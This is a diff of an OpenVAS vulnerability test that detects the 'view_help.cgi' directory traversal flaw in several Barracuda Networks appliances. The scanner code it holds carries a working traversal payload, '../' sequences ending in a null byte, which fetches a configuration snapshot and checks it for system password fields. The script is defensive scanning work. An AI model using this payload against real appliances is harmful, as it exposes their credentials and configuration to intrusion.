@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_barracuda_spam_virus_firewall_43520.nasl 14323 2019-03-19 13:19:09Z jschulte $
 #
 # Barracuda Networks Multiple Products 'view_help.cgi' Directory Traversal Vulnerability
 #
@@ -24,12 +23,11 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.100847");
-  script_version("$Revision: 14323 $");
-  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $");
+  script_version("2019-05-13T14:05:09+0000");
+  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
   script_tag(name:"creation_date", value:"2010-10-06 12:55:58 +0200 (Wed, 06 Oct 2010)");
   script_bugtraq_id(43520);
   script_tag(name:"cvss_base", value:"5.0");
@@ -44,28 +42,36 @@ if (description)
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
-  script_dependencies("gb_barracuda_spam_virus_firewall_detect.nasl");
+  script_dependencies("gb_get_http_banner.nasl");
   script_require_ports("Services/www", 8000);
+  script_require_keys("BarracudaHTTP/banner");
   script_exclude_keys("Settings/disable_cgi_scanning");
+
   script_tag(name:"summary", value:"Multiple Barracuda Networks products are prone to a directory-
-traversal vulnerability because it fails to sufficiently sanitize user-
-supplied input.
+  traversal vulnerability because it fails to sufficiently sanitize user-supplied input.");
 
-A remote attacker can exploit this vulnerability using directory-
-traversal characters ('../') to access files that contain sensitive
-information that can aid in further attacks.
+  script_tag(name:"impact", value:"A remote attacker can exploit this vulnerability using directory-
+  traversal characters ('../') to access files that contain sensitive
+  information that can aid in further attacks.");
 
-Affected:
+  script_tag(name:"affected", value:"Barracuda IM Firewall 3.4.01.004 and earlier
 
-Barracuda IM Firewall 3.4.01.004 and earlier
-Barracuda Link Balancer 2.1.1.010 and earlier
-Barracuda Load Balancer 3.3.1.005 and earlier
-Barracuda Message Archiver 2.2.1.005 and earlier
-Barracuda Spam & Virus Firewall 4.1.2.006 and earlier
-Barracuda SSL VPN 1.7.2.004 and earlier
-Barracuda Web Application Firewall 7.4.0.022 and earlier
-Barracuda Web Filter 4.3.0.013 and earlier");
+  Barracuda Link Balancer 2.1.1.010 and earlier
+
+  Barracuda Load Balancer 3.3.1.005 and earlier
+
+  Barracuda Message Archiver 2.2.1.005 and earlier
+
+  Barracuda Spam & Virus Firewall 4.1.2.006 and earlier
+
+  Barracuda SSL VPN 1.7.2.004 and earlier
+
+  Barracuda Web Application Firewall 7.4.0.022 and earlier
+
+  Barracuda Web Filter 4.3.0.013 and earlier");
+
   script_tag(name:"solution_type", value:"WillNotFix");
+
   script_tag(name:"solution", value:"No known solution was made available for at least one year
   since the disclosure of this vulnerability. Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective features,
@@ -76,23 +82,17 @@ Barracuda Web Filter 4.3.0.013 and earlier");
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("version_func.inc");
 
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 
-u = "/view_help.cgi?locale=/../../../../../../../mail/snapshot/config.snapshot%00";
-d = make_list("/cgi-mod","/cgi-bin");
+foreach dir (make_list("/cgi-mod","/cgi-bin")) {
 
-foreach dir (d) {
-
-  url = dir+u;
-
+  url = dir + "/view_help.cgi?locale=/../../../../../../../mail/snapshot/config.snapshot%00";
   if(http_vuln_check(port:port, url:url,pattern:"system_password",extra_check:make_list("system_netmask","system_default_domain"))) {
-    security_message(port:port);
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
     exit(0);
   }
-
 }
 
 exit(0);
